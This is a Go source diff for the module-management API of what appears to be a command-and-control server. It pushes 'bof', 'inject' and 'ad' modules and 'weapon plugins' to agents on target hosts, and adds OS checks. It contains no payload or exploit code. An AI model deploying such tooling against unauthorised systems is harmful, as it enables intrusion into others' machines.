@@ -20,32 +20,153 @@ import (
 func HandleListModules(c *gin.Context) {
 	ms := services.GetModuleService()
 	agentUUID := strings.TrimSpace(c.Query("uuid"))
-	catalog := ms.ListCatalog(agentUUID)
+	osName := ""
+	if agentUUID != "" {
+		if val, ok := globals.Clients.Load(agentUUID); ok {
+			if cl, ok2 := val.(*globals.Client); ok2 {
+				osName = cl.OS
+			}
+		}
+	}
+	catalog := ms.ListCatalog(agentUUID, osName)
 	c.JSON(http.StatusOK, gin.H{
 		"modules": catalog,
 		// backward-compatible id list
 		"ids": ms.List(),
+		// 模块能力 vs 插件能力 summary for UI
+		"capability_kind": "module",
+		"product_ids":     []string{"bof", "inject", "ad"},
+	})
+}
+
+// HandleCapabilities GET /api/capabilities?uuid= optional
+// Returns unified module/plugin capability matrix for UI gating.
+func HandleCapabilities(c *gin.Context) {
+	ms := services.GetModuleService()
+	agentUUID := strings.TrimSpace(c.Query("uuid"))
+	osName := ""
+	if agentUUID != "" {
+		if val, ok := globals.Clients.Load(agentUUID); ok {
+			if cl, ok2 := val.(*globals.Client); ok2 {
+				osName = cl.OS
+			}
+		}
+	}
+
+	// Warehouse catalog (no OS filter) for registry status; agent-scoped for loaded flags.
+	warehouse := ms.ListCatalog("", "")
+	agentMods := []services.ModuleCatalogEntry{}
+	if agentUUID != "" {
+		agentMods = ms.ListCatalog(agentUUID, osName)
+	}
+
+	type modCap struct {
+		ID           string   `json:"id"`
+		Name         string   `json:"name"`
+		Capabilities []string `json:"capabilities"`
+		Registered   bool     `json:"registered"`
+		Signed       bool     `json:"signed"`
+		Version      string   `json:"version,omitempty"`
+		Loaded       bool     `json:"loaded_on_agent,omitempty"`
+		SupportedOS  []string `json:"supported_os,omitempty"`
+	}
+	moduleCaps := make([]modCap, 0, 3)
+	for _, id := range []string{"bof", "inject", "ad"} {
+		name, _, _, _ := services.ModuleDescribeEx(id)
+		entry := modCap{
+			ID:           id,
+			Name:         name,
+			Capabilities: services.ModuleCapabilities(id),
+			SupportedOS:  []string{"windows"},
+		}
+		for _, e := range warehouse {
+			if e.ID == id {
+				entry.Registered = true
+				entry.Signed = e.Signed
+				entry.Version = e.Version
+				if len(e.SupportedOS) > 0 {
+					entry.SupportedOS = e.SupportedOS
+				}
+				break
+			}
+		}
+		if agentUUID != "" {
+			entry.Loaded = ms.AgentHasModule(agentUUID, id)
+			for _, e := range agentMods {
+				if e.ID == id && e.LoadedOnAgent {
+					entry.Loaded = true
+				}
+			}
+		}
+		moduleCaps = append(moduleCaps, entry)
+	}
+
+	plugins, _ := services.LoadPluginManifest()
+	type plugCap struct {
+		ID             string   `json:"id"`
+		Name           string   `json:"name"`
+		Type           string   `json:"type"`
+		RequiredModule string   `json:"required_module,omitempty"`
+		Capabilities   []string `json:"capabilities"`
+		RequiredOS     string   `json:"required_os,omitempty"`
+	}
+	pluginCaps := make([]plugCap, 0, len(plugins))
+	for _, p := range plugins {
+		cp := p
+		services.EnrichPluginCapabilities(&cp)
+		pluginCaps = append(pluginCaps, plugCap{
+			ID:             cp.ID,
+			Name:           cp.Name,
+			Type:           cp.Type,
+			RequiredModule: cp.RequiredModule,
+			Capabilities:   cp.Capabilities,
+			RequiredOS:     cp.RequiredOS,
+		})
+	}
+
+	unlocked := []string{}
+	if agentUUID != "" {
+		for _, m := range moduleCaps {
+			if m.Loaded {
+				unlocked = append(unlocked, m.Capabilities...)
+			}
+		}
+	}
+
+	c.JSON(http.StatusOK, gin.H{
+		"module_capabilities": moduleCaps, // 模块能力 (L2: bof/inject/ad)
+		"plugin_capabilities": pluginCaps, // 插件能力 (weapon plugins)
+		"agent_uuid":          agentUUID,
+		"agent_os":            osName,
+		"unlocked":            unlocked,
+		"labels": gin.H{
+			"module": "模块能力",
+			"plugin": "插件能力",
+		},
 	})
 }
 
 // HandleUploadModule POST /api/modules/upload
-// form: id=desktop|iso_host|inject, file=<exe/dll>
+// form: id=bof|inject|ad, file=<exe/dll>
 func HandleUploadModule(c *gin.Context) {
 	id := c.PostForm("id")
 	if id == "" {
 		id = c.Query("id")
 	}
 	if id == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "missing module id (desktop | iso_host | inject)"})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "missing module id (bof | inject | ad)"})
 		return
 	}
 	if !services.IsProductModule(id) {
-		c.JSON(http.StatusForbidden, gin.H{"error": "only product modules: desktop, iso_host, inject"})
+		c.JSON(http.StatusForbidden, gin.H{
+			"error": "only product modules: bof, inject, ad",
+			"code":  "forbidden",
+		})
 		return
 	}
 	file, err := c.FormFile("file")
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "missing file"})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "missing file", "code": "missing_file"})
 		return
 	}
 	dir := services.GetModuleService().Dir()
@@ -81,17 +202,18 @@ func HandleUploadModule(c *gin.Context) {
 	}
 	name, desc, kind := services.ModuleDescribe(id)
 	c.JSON(http.StatusOK, gin.H{
-		"msg":         "module registered and signed",
-		"id":          id,
-		"name":        name,
-		"description": desc,
-		"kind":        kind,
-		"sha256":      signed.SHA256,
-		"version":     signed.Version,
-		"signer":      signed.Signer,
-		"signature":   signed.Signature,
-		"signed":      signed.Signature != "",
-		"trust_file":  id + ".trust.json",
+		"msg":          "module registered and signed",
+		"id":           id,
+		"name":         name,
+		"description":  desc,
+		"kind":         kind,
+		"sha256":       signed.SHA256,
+		"version":      signed.Version,
+		"signer":       signed.Signer,
+		"signature":    signed.Signature,
+		"signed":       signed.Signature != "",
+		"trust_file":   id + ".trust.json",
+		"capabilities": services.ModuleCapabilities(id),
 	})
 }
 
@@ -120,7 +242,7 @@ func HandleDeleteModule(c *gin.Context) {
 }
 
 // HandlePushModule POST /api/modules/push
-// json: {"uuid":"...","id":"iso_host","force":true}
+// json: {"uuid":"...","id":"bof","force":true}
 // Waits for agent ack (up to 25s) so UI can show real success / loaded state.
 func HandlePushModule(c *gin.Context) {
 	var req struct {
@@ -133,18 +255,33 @@ func HandlePushModule(c *gin.Context) {
 		return
 	}
 	if !services.IsProductModule(req.ID) {
-		c.JSON(http.StatusForbidden, gin.H{"error": "only product modules: desktop, iso_host, inject", "code": "forbidden"})
+		c.JSON(http.StatusForbidden, gin.H{"error": "only product modules: bof, inject, ad", "code": "forbidden"})
 		return
+	}
+	// Platform gate: refuse to push windows-only modules (bof, inject, ad) to linux agents.
+	if val, ok := globals.Clients.Load(req.UUID); ok {
+		if cl, ok2 := val.(*globals.Client); ok2 {
+			if !services.IsModuleSupportedOnOS(req.ID, cl.OS) {
+				c.JSON(http.StatusForbidden, gin.H{
+					"error":   fmt.Sprintf("module %s is not supported on agent OS %q", req.ID, cl.OS),
+					"code":    "platform_mismatch",
+					"module":  req.ID,
+					"agent_os": cl.OS,
+				})
+				return
+			}
+		}
 	}
 	ms := services.GetModuleService()
 	if !req.Force && ms.AgentHasModule(req.UUID, req.ID) {
 		name, _, _ := services.ModuleDescribe(req.ID)
 		c.JSON(http.StatusOK, gin.H{
-			"msg":    "module already staged/loaded on agent (pass force=true to re-push)",
-			"id":     req.ID,
-			"name":   name,
-			"loaded": true,
-			"alive":  true,
+			"msg":          "module already staged/loaded on agent (pass force=true to re-push)",
+			"id":           req.ID,
+			"name":         name,
+			"loaded":       true,
+			"alive":        true,
+			"capabilities": services.ModuleCapabilities(req.ID),
 		})
 		return
 	}
@@ -174,14 +311,15 @@ func HandlePushModule(c *gin.Context) {
 		return
 	}
 	c.JSON(http.StatusOK, gin.H{
-		"msg":         "模块推送成功，已在目标主机就绪",
-		"id":          req.ID,
-		"name":        name,
-		"description": desc,
-		"kind":        kind,
-		"loaded":      true,
-		"alive":       true,
-		"detail":      out,
+		"msg":          "模块推送成功，已在目标主机就绪",
+		"id":           req.ID,
+		"name":         name,
+		"description":  desc,
+		"kind":         kind,
+		"loaded":       true,
+		"alive":        true,
+		"detail":       out,
+		"capabilities": services.ModuleCapabilities(req.ID),
 	})
 }
 
@@ -190,8 +328,22 @@ func HandlePushModule(c *gin.Context) {
 func HandlePackModule(c *gin.Context) {
 	id := c.Param("id")
 	if !services.IsProductModule(id) {
-		c.JSON(http.StatusForbidden, gin.H{"error": "only product modules: desktop, iso_host, inject", "code": "forbidden"})
+		c.JSON(http.StatusForbidden, gin.H{"error": "only product modules: bof, inject, ad", "code": "forbidden"})
 		return
+	}
+	// Optional platform hint: if uuid given, refuse pack of windows-only module for linux agent.
+	if uuid := strings.TrimSpace(c.Query("uuid")); uuid != "" {
+		if val, ok := globals.Clients.Load(uuid); ok {
+			if cl, ok2 := val.(*globals.Client); ok2 {
+				if !services.IsModuleSupportedOnOS(id, cl.OS) {
+					c.JSON(http.StatusForbidden, gin.H{
+						"error":   fmt.Sprintf("module %s cannot be packed for agent OS %q", id, cl.OS),
+						"code":    "platform_mismatch",
+					})
+					return
+				}
+			}
+		}
 	}
 	ms := services.GetModuleService()
 	name, desc, kind := services.ModuleDescribe(id)
@@ -252,8 +404,14 @@ func HandleQueryAgentModules(c *gin.Context) {
 		return
 	}
 	ms := services.GetModuleService()
+	os := ""
+	if val, ok := globals.Clients.Load(req.UUID); ok {
+		if cl, ok2 := val.(*globals.Client); ok2 {
+			os = cl.OS
+		}
+	}
 	c.JSON(http.StatusOK, gin.H{
 		"result":  out,
-		"modules": ms.ListCatalog(req.UUID),
+		"modules": ms.ListCatalog(req.UUID, os),
 	})
 }
